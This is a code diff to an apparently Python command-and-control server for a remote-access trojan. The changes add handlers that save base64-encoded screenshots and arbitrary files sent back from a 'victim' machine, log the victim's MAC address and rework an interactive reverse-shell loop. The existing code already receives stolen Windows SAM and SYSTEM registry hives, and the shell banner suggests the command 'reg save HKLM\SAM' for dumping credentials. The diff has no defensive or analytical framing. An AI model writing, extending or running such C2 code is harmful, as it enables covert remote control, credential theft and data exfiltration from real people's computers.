@@ -276,7 +276,7 @@ def start_c2_listener():
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.settimeout(1)
     try:
-        server.bind(("0.0.0.0", C2_PORT))
+        server.bind((C2_HOST, C2_PORT))
         server.listen(5)
         print(f"[+] C2 Listener started on port {C2_PORT}")
         
@@ -301,6 +301,7 @@ def start_c2_listener():
                     print(f"\n[+] Target connected from {addr[0]}:{addr[1]}")
                     print(f"[+] Hostname: {cached_fingerprint.get('hostname', 'Unknown')}")
                     print(f"[+] Username: {cached_fingerprint.get('username', 'Unknown')}")
+                    print(f"[+] MAC: {cached_fingerprint.get('mac_address', 'Unknown')}")
                 except Exception as e:
                     print(f"[-] Fingerprint fetch failed: {e}")
                     cached_fingerprint = {}
@@ -313,7 +314,7 @@ def start_c2_listener():
         print(f"[-] Listener error: {e}")
 
 # ======================================================
-# HANDLE SAM FILE
+# HANDLE FILE - SAM
 # ======================================================
 def handle_sam_file(response):
     try:
@@ -340,7 +341,7 @@ def handle_sam_file(response):
         return False
 
 # ======================================================
-# HANDLE SYSTEM FILE
+# HANDLE FILE - SYSTEM
 # ======================================================
 def handle_system_file(response):
     try:
@@ -367,6 +368,67 @@ def handle_system_file(response):
         return False
 
 # ======================================================
+# HANDLE FILE - SCREENSHOT
+# ======================================================
+def handle_screenshot(response):
+    try:
+        if response.startswith("SCREENSHOT:"):
+            parts = response.split(":", 2)
+            if len(parts) == 3:
+                filename = parts[1]
+                encoded = parts[2].strip()
+                
+                missing_padding = len(encoded) % 4
+                if missing_padding:
+                    encoded += '=' * (4 - missing_padding)
+                
+                file_data = base64.b64decode(encoded)
+                save_path = os.path.join(os.getcwd(), filename)
+                
+                with open(save_path, 'wb') as f:
+                    f.write(file_data)
+                
+                print(f"\n📸 Screenshot received!")
+                print(f"[+] Saved to: {save_path}")
+                print(f"[+] File size: {len(file_data) / 1024:.2f} KB")
+                return True
+        return False
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+# ======================================================
+# HANDLE FILE - UPLOAD
+# ======================================================
+def handle_uploaded_file(response):
+    try:
+        if response.startswith("FILE:"):
+            parts = response.split(":", 2)
+            if len(parts) == 3:
+                filename = parts[1]
+                encoded = parts[2].strip()
+                
+                # Fix padding
+                missing_padding = len(encoded) % 4
+                if missing_padding:
+                    encoded += '=' * (4 - missing_padding)
+                
+                file_data = base64.b64decode(encoded)
+                save_path = os.path.join(os.getcwd(), filename)
+                
+                with open(save_path, 'wb') as f:
+                    f.write(file_data)
+                
+                print(f"\n📁 Uploaded file received!")
+                print(f"[+] Saved to: {save_path}")
+                print(f"[+] File size: {len(file_data) / 1024:.2f} KB")
+                return True
+        return False
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+# ======================================================
 # SEND COMMAND
 # ======================================================
 def send_c2_command(cmd_string):
@@ -378,6 +440,7 @@ def send_c2_command(cmd_string):
             return False
     
     try:
+        # Clear buffer
         target_connection.settimeout(1)
         try:
             while True:
@@ -388,9 +451,12 @@ def send_c2_command(cmd_string):
             pass
         target_connection.settimeout(None)
         
+        # Send command
         target_connection.send(cmd_string.encode('utf-8'))
-        target_connection.settimeout(60)
-        raw_response = target_connection.recv(8192).decode('utf-8')
+        
+        # Receive response with larger buffer
+        target_connection.settimeout(120)
+        raw_response = target_connection.recv(65536).decode('utf-8', errors='ignore')
         target_connection.settimeout(None)
         
         clean_response = raw_response.strip()
@@ -400,6 +466,10 @@ def send_c2_command(cmd_string):
                 handle_sam_file(clean_response)
             elif clean_response.startswith("SYSTEM_FILE:"):
                 handle_system_file(clean_response)
+            elif clean_response.startswith("SCREENSHOT:"):
+                handle_screenshot(clean_response)
+            elif clean_response.startswith("FILE:"):
+                handle_uploaded_file(clean_response)
             else:
                 print(f"\n[+] Execution Response from Target:\n{clean_response}")
         else:
@@ -501,6 +571,7 @@ def execute_action(item):
                 print("[!] Execution Failure: No remote target node is currently connected.")
             else:
                 try:
+                    # Clear buffer
                     target_connection.settimeout(1)
                     try:
                         while True:
@@ -511,45 +582,51 @@ def execute_action(item):
                         pass
                     target_connection.settimeout(None)
                     
+                    # Send shell command
                     target_connection.send(b"RUN:SHELL")
-                    target_connection.settimeout(5)
                     
-                    initial_resp = target_connection.recv(4096).decode('utf-8', errors='ignore')
-                    print(initial_resp, end="")
+                    print("\n[+] Reverse Shell Active!")
+                    print("[*] Type 'exit_shell' to return to C2 menu")
+                    print("[*] Special commands: 'screenshot', 'upload C:\\file.txt', 'reg save HKLM\\SAM C:\\SAM.hive'")
+                    print("-" * 50)
                     
                     while True:
-                        cmd_input = input()
-                        
-                        if not cmd_input.strip():
-                            print("CMD> ", end="")
+                        try:
+                            # Receive output with larger buffer and longer timeout
+                            target_connection.settimeout(120)
+                            response = target_connection.recv(65536).decode('utf-8', errors='ignore')
+                            target_connection.settimeout(None)
+                            
+                            if response:
+                                print(response, end="")
+                            else:
+                                print("\n[!] No response - session may have ended")
+                                break
+                                
+                            # Check if shell ended
+                            if "Shell session ended" in response:
+                                break
+                                
+                            # Get user input
+                            cmd = input()
+                            
+                            # Send command
+                            target_connection.send(cmd.encode('utf-8'))
+                            
+                        except socket.timeout:
+                            print("\n[!] No response from victim (timeout)")
+                            target_connection.send(b"\n")
                             continue
-                        
-                        if cmd_input.strip().lower() == "exit_shell":
-                            print("\n[*] Exiting remote interactive shell context...")
+                        except KeyboardInterrupt:
+                            print("\n[*] Interrupted - returning to C2...")
                             target_connection.send(b"exit_shell")
                             break
-                        
-                        target_connection.send(cmd_input.encode('utf-8'))
-                        
-                        response = b""
-                        target_connection.settimeout(15)
-                        while True:
-                            try:
-                                chunk = target_connection.recv(4096)
-                                if not chunk:
-                                    break
-                                response += chunk
-                                if b"CMD> " in chunk:
-                                    break
-                            except socket.timeout:
-                                break
-                        target_connection.settimeout(None)
-                        
-                        decoded = response.decode('utf-8', errors='ignore')
-                        print(decoded, end="")
-                        
+                        except Exception as e:
+                            print(f"\n[!] Error: {e}")
+                            break
+                            
                 except Exception as e:
-                    print(f"[!] Shell link lost during active session: {e}")
+                    print(f"[!] Shell error: {e}")
                     with connection_lock:
                         target_connection = None
                         target_address = None
